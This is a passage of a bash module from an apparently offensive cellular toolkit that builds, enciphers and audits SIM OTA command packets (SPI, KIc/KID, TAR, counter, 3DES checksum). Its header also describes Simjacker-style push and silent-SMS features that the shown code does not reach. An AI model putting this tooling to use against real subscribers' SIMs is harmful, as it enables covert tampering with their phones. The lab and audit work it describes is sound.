#!/usr/bin/env bash
# ota_sms — TS 23.048 OTA command-packet construction and key/counter audit.
#
# An OTA (Over-The-Air) binary SMS is how a carrier updates a SIM: a TS 23.048
# command packet carrying SPI, TAR, counter and a KIc/KID-selected key set. The
# protocol is published, and the S@T push that Simjacker rides is built here
# from S@T 01.00 / 01.23; WIB is refused rather than guessed, because no
# public clause states its command encoding. What is *not* free is the target: affecting a SIM you do not hold needs that
# SIM's OTA keys, so this module is built for own-SIM and lab construction plus
# the audit that finds a weak SPI, a replayed counter or an un-keyed payload.
# 16_sim keeps the reader/defensive side; this module builds and audits.
#
# The security the SPI selects is applied, not described: --packet-sms builds
# the TS 31.115 4.2 SMS Command Packet and enciphers it with 3DES outer-CBC and
# computes its CC per TS 102 225 5.1, and --parse-packet-sms undoes both and
# checks the CC. Keys come from the environment (OTASM_KIC_KEY, OTASM_KID_KEY)
# because an argument is visible to every user on the box. The two clauses are
# cross-checked byte for byte against pySim in tools/ota-oracle/, which is what
# makes a packet that claims a CC and carries none impossible to ship again.
#
# Attack owned: O5 adjacency (SIM/eSIM OTA) — construction plus vulnerability
# detection, per docs/MODULE_ROSTER.md. Own-SIM and lab only.
#
# The second half is the TS 23.040 SMS TP layer (Phase 2 of
# docs/OFFENSIVE-GAP-ANALYSIS.md): TP-MTI/TP-PID/TP-DCS/TP-SCTS/address/TP-UDL
# encode and parse, plus the Type 0 "silent SMS" audit. A Type 0 message is
# acknowledged by the ME and then discarded without indication or storage
# (TS 23.040 §9.2.3.9), so it is the one message whose success is invisible —
# which is exactly why the parser must classify it rather than treat it as an
# ordinary message with an empty body. Nothing here transmits: delivery is a
# handoff to a loopback SMSC you run (--plan-tp).
#
# The third layer is SMPP 3.4 (ESME <-> SMSC, TCP 2775): bind_transceiver,
# submit_sm and deliver_sm are built and parsed here -- the 16-octet header,
# C-Octet Strings whose terminating NUL counts in the field, and the integer
# body fields -- with the matching *_resp and the command-id/direction table.
# tools/check-smpp.sh writes each built PDU into a pcap and reads it back with
# the tshark SMPP dissector, which is what proves the length octets and every
# C-Octet boundary against where the dissector puts the field.
#
# Resolve IMSISTING_ROOT from this script's own path (MODULE_CONVENTIONS §2).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/ota_sms"
OTASM_DIR="$LOOT_DIR/ota_sms"
mkdir -p "$MOD_TMP" "$OTASM_DIR" 2>/dev/null

declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
declare -F ok   >/dev/null 2>&1 || ok()   { printf '[ok]   %s\n' "$*" >&2; }
declare -F banner >/dev/null 2>&1 || banner() { :; }

otasm_sanitize() { printf '%s' "${1:-}" | tr '\t\r\n' '   '; }
OTASM_F=()
otasm_split() {
    OTASM_F=()
    local i n
    n=$(printf '%s' "$1" | awk -F'\t' '{print NF}')
    for (( i = 1; i <= n; i++ )); do
        OTASM_F+=("$(printf '%s' "$1" | cut -f"$i")")
    done
}
otasm_norm_hex() { printf '%s' "${1:-}" | tr -d ' \t\r\n:.-' | sed 's/^0x//I' | tr 'A-F' 'a-f'; }
otasm_is_hex() {
    local h; h=$(otasm_norm_hex "${1:-}")
    [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ && $(( ${#h} % 2 )) -eq 0 ]]
}
otasm_byte() { printf '%02X' "$(( ${1:-0} & 0xFF ))"; }

otasm_status_tsv() {
    printf 'MODULE\tota_sms\n'
    printf 'TARGET\tTS 23.048 OTA command packet, SPI, TAR, counter, key audit\n'
    printf 'TARGET2\tTS 23.040 SMS TP layer + TS 23.038 alphabet/DCS; Type 0 silent SMS\n'
    printf 'SCOPE\town-SIM and lab; a live subscriber needs their OTA keys\n'
    printf 'TRANSMIT\tnone — construction and audit; delivery is a handoff\n'
    printf 'TP_LAYER\tMTI/PID/DCS/SCTS/address/UDL encode and parse; Type 0 audit\n'
    printf 'KAT\tTS 23.038 §6.1.2.1.1 packing vectors (hi=e834, hello=e8329bfd06)\n'
    printf 'PUSH\tS@T push built (--sat-push): 42/deck/card + 2d macros in a TS 31.115 packet, TAR 505348, SMS TP-PID 0x7F\n'
    printf 'WIB\trefused (--wib-push): no citable WIB command encoding, so no push is invented\n'
    printf 'SMPP\theader and C-Octet body build/parse for bind_transceiver, submit_sm and deliver_sm (oracle: tools/check-smpp.sh)\n'
    printf 'SMPP_RESP\tmatching *_resp with the request sequence number; query_sm/submit_multi/data_sm/outbind/broadcast responses refused with WHY\n'
    printf 'SELFTEST\tyes\n'
}

# ── BER length (X.690 §8.1.3) for the CPL field ─────────────────────────
otasm_berlen() {
    local n="${1:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || { printf 'ERROR\tlength must be numeric\n' >&2; return 2; }
    (( n <= 127 )) && { printf '%02X' "$(( n & 0xFF ))"; return 0; }
    if (( n <= 0xFF )); then printf '81%02X' "$(( n & 0xFF ))"
    elif (( n <= 0xFFFF )); then printf '82%02X%02X' "$(( (n>>8)&0xFF ))" "$(( n&0xFF ))"
    else printf 'ERROR\tlength too large\n' >&2; return 2; fi
}
# read a BER length at octet offset $1; prints "value<TAB>octets"
otasm_berlen_read() {
    local h="$1" off="${2:-0}"
    local b0=$(( 16#${h:$((off*2)):2} ))
    if (( (b0 & 0x80) == 0 )); then printf '%d\t1' "$b0"; return 0; fi
    local n=$(( b0 & 0x7F ))
    (( n >= 1 && n <= 3 )) || { printf 'ERROR\tlength-of-length %d unsupported\n' "$n" >&2; return 1; }
    local v=$(( 16#${h:$(( (off+1)*2 )):$((n*2))} ))
    printf '%d\t%d' "$v" "$(( n + 1 ))"
}

# ── SPI (TS 23.048 §8.1) ────────────────────────────────────────────────
# Octet 1: b8-b7 RC/CC/DS, b6 ciphering, b5-b4 counter, b3-b1 reserved.
# Octet 2: b8-b7 PoR, b6-b5 PoR RC/CC/DS, b4 PoR ciphering, b3 PoR transport,
#          b2-b1 reserved. (Same bit layout as 16_sim's sim_spi_decode.)
# TS 102 225 §5.1.1. The two octets are NOT laid out in the order the
# fields are listed in, and the prose of the same clause is what fixes them:
# it names the command's own integrity field as "SPI1.b2b1", and it says
# "SPI2.b4b3 shall be set to the same value as SPI1.b2b1" when both the
# command and its response carry RC/CC/DS.
#   first octet   b8..b6 reserved | b5b4 counter | b3 ciphering | b2b1 RC/CC/DS
#   second octet  b8b7 reserved | b6 SMS-SUBMIT bit (TS 31.115 §4.2) |
#                 b5 PoR ciphered | b4b3 PoR RC/CC/DS | b2b1 PoR mode
otasm_spi_build() {
    local rccds="${1:-0}" cipher="${2:-0}" counter="${3:-0}"
    local por="${4:-0}" por_rccds="${5:-0}" por_cipher="${6:-0}" por_submit="${7:-0}"
    local i
    for i in "$rccds" "$cipher" "$counter" "$por" "$por_rccds" "$por_cipher" "$por_submit"; do
        [[ "$i" =~ ^[0-9]+$ ]] || { printf 'ERROR\tSPI fields must be numeric\n' >&2; return 2; }
    done
    (( rccds <= 3 && cipher <= 1 && counter <= 3 && por <= 3 && por_rccds <= 3 && por_cipher <= 1 && por_submit <= 1 )) || {
        printf 'ERROR\tSPI sub-field out of range\n' >&2; return 2; }
    local o1=$(( (counter << 3) | (cipher << 2) | rccds ))
    local o2=$(( por | (por_rccds << 2) | (por_cipher << 4) | (por_submit << 5) ))
    printf 'spi\t%02X%02X\noctet1\t%02X\noctet2\t%02X\n' "$o1" "$o2" "$o1" "$o2"
    printf 'rccds\t%s\nciphering\t%s\ncounter_mode\t%s\n' "$rccds" "$cipher" "$counter"
    printf 'por\t%s\npor_rccds\t%s\npor_cipher\t%s\npor_submit\t%s\n' \
        "$por" "$por_rccds" "$por_cipher" "$por_submit"
    return 0
}
otasm_spi_parse() {
    local in="${1:-}" h
    if [[ "$in" =~ ^[0-9A-Fa-f]{4}$ ]]; then
        h=$(printf '%s' "$in" | tr 'A-F' 'a-f')
    elif [[ "$in" =~ ^[0-9]+$ ]]; then
        printf -v h '%04X' "$(( in & 0xFFFF ))"
    else
        printf 'ERROR\tSPI must be 2 octets of hex or a 16-bit decimal\n' >&2; return 2
    fi
    [[ "$h" =~ ^[0-9a-f]{4}$ ]] || { printf 'ERROR\tSPI must be 2 octets of hex or a 16-bit decimal\n' >&2; return 2; }
    local o1=$(( 16#${h:0:2} )) o2=$(( 16#${h:2:2} ))
    local counter=$(( (o1>>3)&3 )) cipher=$(( (o1>>2)&1 )) rccds=$(( o1&3 ))
    local reserved1=$(( (o1>>5)&7 ))
    local por=$(( o2&3 )) por_rccds=$(( (o2>>2)&3 )) por_cipher=$(( (o2>>4)&1 ))
    local por_submit=$(( (o2>>5)&1 )) reserved2=$(( (o2>>6)&3 ))
    local rccds_t counter_t por_t
    case "$rccds" in 0) rccds_t="no RC, CC or DS";; 1) rccds_t="RC";; 2) rccds_t="CC";; 3) rccds_t="DS";; esac
    case "$counter" in
        0) counter_t="no counter (the field is present but ignored)";;
        1) counter_t="informational only (replay possible)";;
        2) counter_t="process iff counter > RE";;
        3) counter_t="process iff counter == RE+1 (strict)";; esac
    case "$por" in
        0) por_t="no PoR requested";;
        1) por_t="PoR required";;
        2) por_t="PoR only on error";;
        3) por_t="reserved";; esac
    printf 'spi\t%s\noctet1\t%02x\noctet2\t%02x\n' "$h" "$o1" "$o2"
    printf 'rccds\t%s\nrccds_meaning\t%s\nciphering\t%s\n' "$rccds" "$rccds_t" "$cipher"
    printf 'ciphering_meaning\t%s\ncounter_mode\t%s\ncounter_meaning\t%s\n' \
        "$([[ $cipher -eq 1 ]] && echo "applied" || echo "NOT applied (payload in the clear)")" "$counter" "$counter_t"
    printf 'por\t%s\npor_meaning\t%s\npor_rccds\t%s\npor_cipher\t%s\npor_submit\t%s\n' \
        "$por" "$por_t" "$por_rccds" "$por_cipher" "$por_submit"
    printf 'reserved\t%s,%s\n' "$reserved1" "$reserved2"
    local n=0
    (( cipher == 0 )) && { printf 'finding\tHIGH\tSPI octet1 b3=0 — the command payload is sent in the clear\n'; n=$((n+1)); }
    (( rccds == 0 )) && { printf 'finding\tHIGH\tSPI octet1 b2b1=00 — no RC/CC/DS; the packet has no integrity protection\n'; n=$((n+1)); }
    (( counter == 0 || counter == 1 )) && { printf 'finding\tMEDIUM\tSPI octet1 b5b4=%d — the counter does not stop a replay\n' "$counter"; n=$((n+1)); }
    (( n == 0 )) && printf 'note\tINFO\tciphering on, integrity present, counter enforced\n'
    printf 'findings\t%d\n' "$n"
    return 0
}

# TS 102 225 §5.1.2 (KIc) and §5.1.3.1 (KID for CC), one octet each:
#   b8..b5 key set number | b4b3 mode | b2b1 algorithm family
# b4b3 only has meaning when the family is DES (b2b1 = 01); the whole low
# nibble is what an implementation calls its "algorithm" enum (5 = 3DES
# outer-CBC with two keys, 9 = three keys, 2 = AES-CBC).
otasm_key_meaning() {
    local kind="$1" v="${2^^}"
    [[ "$v" =~ ^[0-9A-F]{2}$ ]] || { printf 'ERROR\t%s must be one hex octet\n' "$kind" >&2; return 2; }
    local val=$(( 16#$v ))
    local key_set=$(( (val >> 4) & 0x0F ))
    local mode=$(( (val >> 2) & 0x03 ))
    local family=$(( val & 0x03 ))
    local family_t mode_t strength
    case "$family" in
        0) family_t="algorithm known implicitly by both entities" ;;
        1) family_t="DES (ISO 8731-1 DEA)" ;;
        2) family_t="reserved" ;;
        3) family_t="proprietary implementation" ;;
    esac
    local is_cipher=1
    [[ "$kind" == "kid" ]] && is_cipher=0
    if [[ "$family" == "1" ]]; then
        case "$mode" in
            0) mode_t="$([[ $is_cipher == 1 ]] && echo "DES in CBC mode" || echo "DES in CBC mode over the CC") (56-bit key, zero IV)" ;;
            1) mode_t="Triple DES outer-CBC with two keys (112-bit effective)" ;;
            2) mode_t="Triple DES outer-CBC with three keys (168-bit)" ;;
            3) mode_t="$([[ $is_cipher == 1 ]] && echo "DES in ECB mode (no chaining)" || echo "reserved for KID_RC")" ;;
        esac
    else
        mode_t="b4b3 carries no meaning for family $family"
    fi
    case "$family" in
        0) strength="weak — implicit algorithm, no negotiated strength" ;;
        1) case "$mode" in
               0) strength="weak — single DES, 56-bit key" ;;
               1) strength="weak — 2-key 3DES, 112-bit effective" ;;
               2) strength="acceptable — 3-key 3DES" ;;
               3) strength="critical — DES-ECB, 56-bit key and no chaining" ;;
           esac ;;
        2) strength="unknown — reserved algorithm family" ;;
        3) strength="unknown — proprietary, cannot be assessed" ;;
    esac
    printf '%s_hex\t0x%s\n%s_key_set\t%s\n%s_family\t%s\n%s_family_meaning\t%s\n' \
        "$kind" "$v" "$kind" "$key_set" "$kind" "$family" "$kind" "$family_t"
    printf '%s_mode\t%s\n%s_mode_meaning\t%s\n%s_strength\t%s\n' \
        "$kind" "$mode" "$kind" "$mode_t" "$kind" "$strength"
    return 0
}

# The KIc/KID pair as they appear in a Command Header. The primary fields are
# unprefixed so a caller can read them without knowing the kind.
otasm_cmd_key() {
    local kic="${1:-}" kid="${2:-}" out
    [[ -n "$kic" ]] || { printf 'ERROR\tusage: --key <KIc> [<KID>]\n' >&2; return 2; }
    out=$(otasm_key_meaning kic "$kic") || return $?
    printf '%s\n' "$out" | sed -e 's/^kic_//'
    if [[ -n "$kid" ]]; then
        otasm_key_meaning kid "$kid" || return $?
        local ks kds
        ks=$(printf '%s\n' "$out" | awk -F'\t' '$1=="kic_key_set"{print $2}')
        kds=$(otasm_key_meaning kid "$kid" | awk -F'\t' '$1=="kid_key_set"{print $2}')
        if [[ "$ks" == "$kds" ]]; then
            printf 'finding\tMEDIUM\tKIc and KID name the same key set %s — one recovered key breaks confidentiality and integrity together\n' "$ks"
        fi
    fi
    return 0
}

# ── command packet build / parse (TS 23.048 §5.1.1) ─────────────────────
#   CPI(1) CPL(BER) CHI(1) CHL(1) CMD(CHL) SPI(2) KIc(1) KID(1) TAR(3)
#   CNTR(5) PCNTR(1) DATA(rest)
otasm_packet_build() {
    local cpi="${1:-01}" tar="${2:-000000}" counter="${3:-0}" spi="${4:-B800}"
    local kic="${5:-01}" kid="${6:-01}" data; data=$(otasm_norm_hex "${7:-}")
    local chi="${8:-01}" cmd; cmd=$(otasm_norm_hex "${9:-01}")
    [[ "$counter" =~ ^[0-9]+$ ]] || { printf 'ERROR\tcounter must be numeric\n' >&2; return 2; }
    otasm_is_hex "$tar" && (( ${#tar} == 6 )) || { printf 'ERROR\tTAR must be 3 octets of hex\n' >&2; return 2; }
    otasm_is_hex "$spi" && (( ${#spi} == 4 )) || { printf 'ERROR\tSPI must be 2 octets of hex\n' >&2; return 2; }
    local cntr; printf -v cntr '%010X' "$(( counter & 0xFFFFFFFFFF ))"
    local chl=$(( ${#cmd} / 2 ))
    local rest; rest="${chi}$(otasm_byte "$chl")${cmd}${spi}${kic}${kid}${tar}${cntr}00${data}"
    # CPL counts from the Command Header Identifier to the end of the Secured
    # Data (TS 102 225 5.1 Table 1), so it is the length of everything after the
    # CPI and after the CPL field itself -- not, as this used to compute, the
    # length of the whole packet. Here CPL is BER-coded (Table 1 says so unless
    # a clause states otherwise; TS 31.115 4.2 is the clause that does).
    local span=$(( ${#rest}/2 ))
    local cpl
    if (( span <= 127 )); then cpl=$(printf '%02X' "$span")
    elif (( span <= 255 )); then cpl=$(printf '81%02X' "$span")
    else cpl=$(printf '82%04X' "$span"); fi
    printf '%s%s%s\n' "$cpi" "$cpl" "$rest"
}
otasm_packet_parse() {
    local h; h=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$h" || { printf 'ERROR\tnot valid hex\n' >&2; return 2; }
    (( ${#h} >= 2 + 2 + 2 + 2 + 2 + 4 + 2 + 2 + 6 + 10 + 2 )) || {
        printf 'ERROR\tpacket shorter than the minimum command packet\n' >&2; return 1; }
    local cpi="${h:0:2}"
    local cpl_read; cpl_read=$(otasm_berlen_read "$h" 1) || return 1
    local cpl; cpl=$(printf '%s' "$cpl_read" | cut -f1)
    local cpl_oct=$(printf '%s' "$cpl_read" | cut -f2)
    local off=$(( 1 + cpl_oct ))
    # CPL has to describe the packet it arrived in, or the header that follows
    # is not the header this byte count owns.
    local total=$(( ${#h} / 2 ))
    if (( cpl != total - 1 - cpl_oct )); then
        printf 'ERROR\tCPL says %d octets after the CPI, the packet carries %d\n' \
            "$cpl" "$(( total - 1 - cpl_oct ))" >&2
        return 1
    fi
    local chi="${h:$((off*2)):2}"; off=$(( off + 1 ))
    local chl=$(( 16#${h:$((off*2)):2} )); off=$(( off + 1 ))
    local cmd="${h:$((off*2)):$((chl*2))}"; off=$(( off + chl ))
    local spi="${h:$((off*2)):4}"; off=$(( off + 2 ))
    local kic="${h:$((off*2)):2}"; off=$(( off + 1 ))
    local kid="${h:$((off*2)):2}"; off=$(( off + 1 ))
    local tar="${h:$((off*2)):6}"; off=$(( off + 3 ))
    local cntr="${h:$((off*2)):10}"; off=$(( off + 5 ))
    local pcntr="${h:$((off*2)):2}"; off=$(( off + 1 ))
    local data="${h:$((off*2))}"
    local cn=$(( 16#${cntr} ))
    printf 'cpi\t%s\ncpl\t%d\ncpl_octets\t%d\nchi\t%s\nchl\t%d\ncmd\t%s\nspi\t%s\n' \
        "$cpi" "$cpl" "$cpl_oct" "$chi" "$chl" "$cmd" "$spi"
    printf 'kic\t%s\nkid\t%s\ntar\t%s\ncounter\t%s\ncounter_dec\t%d\npcntr\t%s\ndata\t%s\n' \
        "$kic" "$kid" "$tar" "$cntr" "$cn" "$pcntr" "$data"
    printf 'packet_bytes\t%d\n' "$(( ${#h}/2 ))"
}

# ── the security layer actually applied (TS 102 225 5.1, TS 31.115 4.2) ─
# The SPI says whether the payload is ciphered and whether the packet carries a
# CC. Until this section existed the module could say that and not do it: there
# was no ciphering code and no CC anywhere in the file, so a packet claiming
# both arrived with neither -- the same defect as printing a transmission that
# was never keyed. What is below is 3DES outer-CBC, the CC being the last eight
# octets of it over the zero-padded message, and the counters and lengths the
# two clauses ask for.
#
# openssl is the cipher because it is on every host this toolkit has run on and
# is already how 13_nr_core.sh computes HMAC-SHA-256; 2-key 3DES is the one
# thing openssl will not accept directly, so the key is expanded here.

# K1||K2 (16 octets) means 3DES with two keys, which is K1||K2||K1 on the wire.
otasm_key24() {
    local k; k=$(otasm_norm_hex "${1:-}")
    if ! otasm_is_hex "$k"; then
        printf 'ERROR\tkey must be hex\n' >&2; return 2
    fi
    case ${#k} in
        32) printf '%s%s\n' "$k" "${k:0:16}" ;;
        48) printf '%s\n' "$k" ;;
        *)  printf 'ERROR\tkey must be 16 octets (2-key 3DES) or 24 octets (3-key 3DES), got %d\n' \
                "$(( ${#k} / 2 ))" >&2; return 2 ;;
    esac
}

# 3DES outer-CBC with a zero IV, no padding: the caller decides the length.
# The direction is explicit because both are used, and a parser that silently
# encrypts when it meant to decrypt looks exactly like a wrong key.
otasm_des3_cbc() {
    local key24="${1^^}" data dir="${3:-enc}" flag=""
    data=$(otasm_norm_hex "${2:-}")
    [[ "$dir" == "dec" ]] && flag="-d"
    if (( ${#data} % 16 != 0 )); then
        printf 'ERROR\t3DES-CBC input must be whole 8-octet blocks, %d octets given\n' \
            "$(( ${#data} / 2 ))" >&2
        return 2
    fi
    printf '%s' "$data" | xxd -r -p \
        | openssl enc -des-ede3-cbc $flag -K "$key24" -iv 0000000000000000 -nopad 2>/dev/null \
        | xxd -p | tr -d '\n'
}

# The CC is the last 8 octets of 3DES-CBC over the zero-padded message
# (TS 102 225 5.2.2). Padding rather than refusing is what the clause asks for.
otasm_des3_cc() {
    local key24="${1^^}" data ct
    data=$(otasm_norm_hex "${2:-}")
    if ! otasm_is_hex "$data"; then
        printf 'ERROR\tCC input must be hex\n' >&2; return 2
    fi
    if (( ${#data} % 2 != 0 )); then
        printf 'ERROR\tCC input must be whole octets\n' >&2; return 2
    fi
    local pad=$(( (8 - (${#data} / 2) % 8) % 8 ))
    if (( pad > 0 )); then data+=$(printf '%0*d' $(( pad * 2 )) 0); fi
    ct=$(otasm_des3_cbc "$key24" "$data" enc) || return 1
    printf '%s\n' "${ct: -16}"
}

# One field out of otasm_spi_parse, so this module reads the SPI bits in exactly
# one place -- the reason the old reading survived was that there were three.
otasm_spi_field() {
    local spi="${1:-}" field="${2:-}"
    otasm_spi_parse "$spi" | awk -F'\t' -v f="$field" '$1==f{v=$2} END{print v}'
}

# --packet-sms <tar> <counter> <spi> <kic> <kid> <apdu-hex>
# Keys come from the environment, not the command line: an argument is visible
# in ps to every user on the box.
#   OTASM_KIC_KEY  ciphering key (16 or 24 octets of hex)
#   OTASM_KID_KEY  integrity key
otasm_packet_sms_build() {
    local tar="${1:-000000}" counter="${2:-0}" spi="${3:-1600}"
    local kic="${4:-15}" kid="${5:-25}" apdu; apdu=$(otasm_norm_hex "${6:-}")
    [[ "$counter" =~ ^[0-9]+$ ]] || { printf 'ERROR\tcounter must be numeric\n' >&2; return 2; }
    otasm_is_hex "$tar" && (( ${#tar} == 6 )) || {
        printf 'ERROR\tTAR must be 3 octets of hex\n' >&2; return 2; }
    otasm_is_hex "$spi" && (( ${#spi} == 4 )) || {
        printf 'ERROR\tSPI must be 2 octets of hex\n' >&2; return 2; }
    otasm_is_hex "$kic" && (( ${#kic} == 2 )) || {
        printf 'ERROR\tKIc must be one octet of hex\n' >&2; return 2; }
    otasm_is_hex "$kid" && (( ${#kid} == 2 )) || {
        printf 'ERROR\tKID must be one octet of hex\n' >&2; return 2; }
    if [[ -n "$apdu" ]] && { ! otasm_is_hex "$apdu" || (( ${#apdu} % 2 != 0 )); }; then
        printf 'ERROR\tcommand data must be whole octets of hex\n' >&2; return 2
    fi

    local rccds cipher
    rccds=$(otasm_spi_field "$spi" rccds)
    cipher=$(otasm_spi_field "$spi" ciphering)
    [[ -n "$rccds" && -n "$cipher" ]] || { printf 'ERROR\tSPI could not be read\n' >&2; return 2; }

    local len_sig=0
    (( rccds == 2 )) && len_sig=8
    if (( rccds == 1 || rccds == 3 )); then
        printf 'ERROR\tSPI asks for RC/DS (b2b1=%s); this verb implements CC only\n' \
            "$rccds" >&2
        return 2
    fi

    local kic_key24="" kid_key24=""
    if (( cipher == 1 )); then
        [[ -n "${OTASM_KIC_KEY:-}" ]] || {
            printf 'ERROR\tSPI says the payload is ciphered, but OTASM_KIC_KEY is not set\n' >&2
            return 2; }
        kic_key24=$(otasm_key24 "$OTASM_KIC_KEY") || return 2
    fi
    if (( rccds == 2 )); then
        [[ -n "${OTASM_KID_KEY:-}" ]] || {
            printf 'ERROR\tSPI asks for a CC, but OTASM_KID_KEY is not set\n' >&2
            return 2; }
        kid_key24=$(otasm_key24 "$OTASM_KID_KEY") || return 2
    fi

    local cntr; printf -v cntr '%010X' "$(( counter & 0xFFFFFFFFFF ))"
    local data="$apdu" pad_octets=0
    if (( cipher == 1 )); then
        # TS 102 225 5.1.1: the ciphered region is CNTR(5)||PCNTR(1)||CC(8)||
        # Secured Data, so the Secured Data is padded until that is a block
        # multiple. The padding count rides in PCNTR.
        pad_octets=$(( (8 - (14 + ${#data} / 2) % 8) % 8 ))
        if (( pad_octets > 0 )); then
            data+=$(printf '%0*d' $(( pad_octets * 2 )) 0)
        fi
    fi
    local pcntr; printf -v pcntr '%02X' "$pad_octets"
    local chl=$(( 13 + len_sig ))
    local head; head=$(printf '%02X%s%s%s%s' "$chl" "${spi^^}" "${kic^^}" "${kid^^}" "${tar^^}")
    local cpl=$(( 1 + chl + ${#data} / 2 ))
    local cc="" body
    if (( rccds == 2 )); then
        # The CPL and CHL fields are part of the CC input and are not ciphered.
        cc=$(otasm_des3_cc "$kid_key24" "$(printf '%04X%s%s%s' "$cpl" "$head" "$cntr$pcntr" "$data")") || return 1
        body="${cntr}${pcntr}${cc}${data}"
    else
        body="${cntr}${pcntr}${data}"
    fi
    local packet
    if (( cipher == 1 )); then
        local ciph; ciph=$(otasm_des3_cbc "$kic_key24" "$body") || return 1
        packet=$(printf '%04X%s%s' "$cpl" "$head" "$ciph")
    else
        packet=$(printf '%04X%s%s' "$cpl" "$head" "$body")
    fi
    printf 'cpl\t%d\nchl\t%d\nspi\t%s\nrccds\t%s\nciphering\t%s\n' \
        "$cpl" "$chl" "${spi^^}" "$rccds" "$cipher"
    printf 'kic\t%s\nkid\t%s\ntar\t%s\ncounter\t%s\npcntr\t%s\n' \
        "${kic^^}" "${kid^^}" "${tar^^}" "$cntr" "$pcntr"
    printf 'padding_octets\t%s\nsecured_data_len\t%s\n' "$pad_octets" "$(( ${#data} / 2 ))"
    if [[ -n "$cc" ]]; then printf 'cc\tsigner\t%s\n' "${cc^^}"; else printf 'cc\tnone\n'; fi
    # One case for every hex field: the keys and the header are upper case, so
    # the cipher text and the CC are too, whatever xxd produced.
    printf 'packet\t%s\npacket_bytes\t%s\n' "${packet^^}" "$(( ${#packet} / 2 ))"
    return 0
}

# --parse-packet-sms <hex>: the inverse, including the CC check. A packet whose
# CC does not verify is reported as such: that is the only useful answer.
otasm_packet_sms_parse() {
    local h; h=$(otasm_norm_hex "${1:-}")
    if ! otasm_is_hex "$h"; then printf 'ERROR\tnot valid hex\n' >&2; return 2; fi
    h="${h^^}"
    if (( ${#h} < 2 * (2 + 1 + 8) )); then
        printf 'ERROR\tpacket shorter than CPL+CHL+SPI+KIc+KID+TAR\n' >&2; return 1
    fi
    local cpl=$(( 16#${h:0:4} )) chl=$(( 16#${h:4:2} ))
    local spi="${h:6:4}" kic="${h:10:2}" kid="${h:12:2}" tar="${h:14:6}"
    local rccds cipher
    rccds=$(otasm_spi_field "$spi" rccds)
    cipher=$(otasm_spi_field "$spi" ciphering)
    local len_sig=0; (( rccds == 2 )) && len_sig=8
    if (( chl != 13 + len_sig )); then
        printf 'ERROR\tCHL is %d, the SPI asks for %d octets from the SPI to the end of the CC\n' \
            "$chl" "$(( 13 + len_sig ))" >&2
        return 1
    fi
    local after_cpl=$(( ${#h} / 2 - 2 ))
    if (( cpl != after_cpl )); then
        printf 'ERROR\tCPL says %d octets after the CPL field, the packet carries %d\n' \
            "$cpl" "$after_cpl" >&2
        return 1
    fi
    local rest body
    rest="${h:8}"   # SPI || KIc || KID || TAR || [enciphered CNTR..data]
    body="${h:20}"  # everything after the 10-octet head
    if (( cipher == 1 )); then
        [[ -n "${OTASM_KIC_KEY:-}" ]] || {
            printf 'ERROR\tthe payload is ciphered and OTASM_KIC_KEY is not set\n' >&2
            return 2; }
        local kic_key24; kic_key24=$(otasm_key24 "$OTASM_KIC_KEY") || return 2
        body=$(otasm_des3_cbc "$kic_key24" "$body" dec) || return 1
    fi
    local cntr="${body:0:10}" pcntr="${body:10:2}"
    local cc="" data pad_octets
    if (( rccds == 2 )); then
        cc="${body:12:16}"; data="${body:28}"
    else
        data="${body:12}"
    fi
    pad_octets=$(( 16#${pcntr} ))
    local cc_verdict="not-present"
    if (( rccds == 2 )); then
        if [[ -n "${OTASM_KID_KEY:-}" ]]; then
            local kid_key24 head recomputed
            kid_key24=$(otasm_key24 "$OTASM_KID_KEY") || return 2
            head="${h:4:16}"   # CHL || SPI || KIc || KID || TAR
            recomputed=$(otasm_des3_cc "$kid_key24" \
                "$(printf '%04X%s%s%s' "$cpl" "$head" "$cntr$pcntr" "$data")") || return 1
            if [[ "${recomputed^^}" == "${cc^^}" ]]; then cc_verdict="verified"
            else cc_verdict="mismatch"; fi
        else
            cc_verdict="unknown-no-OTASM_KID_KEY"
        fi
    fi
    # The CC verdict is decided first and reported even when the padding
    # count turns out to be nonsense: a tampered packet fails the CC, and
    # "the CC does not verify" is the answer, not "the padding looks odd".
    local apdu="$data" pad_ok=1
    if (( pad_octets > 0 )); then
        if (( ${#apdu} / 2 < pad_octets )); then
            pad_ok=0
        else
            apdu="${apdu:0:$(( ${#apdu} - pad_octets * 2 ))}"
        fi
    fi
    printf 'cpl\t%d\nchl\t%d\nspi\t%s\nrccds\t%s\nciphering\t%s\n' \
        "$cpl" "$chl" "${spi^^}" "$rccds" "$cipher"
    printf 'kic\t%s\nkid\t%s\ntar\t%s\ncounter\t%s\npcntr\t%s\n' \
        "${kic^^}" "${kid^^}" "${tar^^}" "$cntr" "$pcntr"
    printf 'cc\t%s\ncc_verdict\t%s\npadding_octets\t%s\n' "${cc:-none}" "$cc_verdict" "$pad_octets"
    printf 'secured_data\t%s\napdu\t%s\npacket_bytes\t%s\n' "${data^^}" "${apdu^^}" "$(( ${#h} / 2 ))"
    if (( pad_ok == 0 )); then
